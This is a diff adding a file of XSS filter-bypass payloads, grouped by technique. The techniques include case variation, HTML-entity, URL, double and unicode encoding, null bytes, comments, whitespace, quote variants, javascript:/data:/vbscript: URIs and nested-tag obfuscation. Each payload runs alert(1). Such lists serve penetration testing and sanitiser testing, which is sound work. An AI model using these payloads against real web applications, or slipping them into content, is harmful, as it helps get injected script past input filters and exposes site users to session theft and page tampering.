@@ -1,0 +1,64 @@
+# Filter bypass XSS payloads
+# Case variation bypasses
+<ScRiPt>alert(1)</ScRiPt>
+<IMG SRC=x ONERROR=alert(1)>
+<SVG ONLOAD=alert(1)>
+<iMg sRc=x OnErRoR=alert(1)>
+
+# Encoding bypasses
+<script>alert&#40;1&#41;</script>
+<script>alert&#x28;1&#x29;</script>
+<img src=x onerror=alert&#40;1&#41;>
+<svg onload=alert&#x28;1&#x29;>
+
+# HTML entity encoding
+&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;img src=x onerror=alert(1)&gt;
+
+# URL encoding
+%3Cscript%3Ealert(1)%3C/script%3E
+%3Cimg%20src=x%20onerror=alert(1)%3E
+
+# Double encoding
+%253Cscript%253Ealert(1)%253C/script%253E
+%253Cimg%2520src=x%2520onerror=alert(1)%253E
+
+# Unicode bypasses
+<script>alert\u0028\u0031\u0029</script>
+<img src=x onerror=alert\u0028\u0031\u0029>
+<script>\u0061lert(1)</script>
+
+# Null byte bypasses
+<script>alert(1)</script>%00
+<img src=x onerror=alert(1)>%00
+<script%00>alert(1)</script>
+
+# Comment bypasses
+<script>/**/alert(1)</script>
+<img src=x onerror=/**/alert(1)>
+<script>al/**/ert(1)</script>
+
+# Whitespace bypasses
+<script	>alert(1)</script>
+<script
+>alert(1)</script>
+<script >alert(1)</script>
+<img	src=x	onerror=alert(1)>
+<script >alert(1)</script>
+
+# Attribute quote bypasses
+<img src=x onerror="alert(1)">
+<img src=x onerror='alert(1)'>
+<img src=x onerror=`alert(1)`>
+<img src=x onerror=alert(1)>
+
+# Protocol bypasses
+<img src="javascript:alert(1)">
+<img src="data:text/html,<script>alert(1)</script>">
+<img src="vbscript:alert(1)">
+<iframe src="javascript:alert(1)">
+
+# Tag name obfuscation
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<img<img src=x onerror=alert(1)//> src=x onerror=alert(1)>
+<svg<svg onload=alert(1)//> onload=alert(1)>
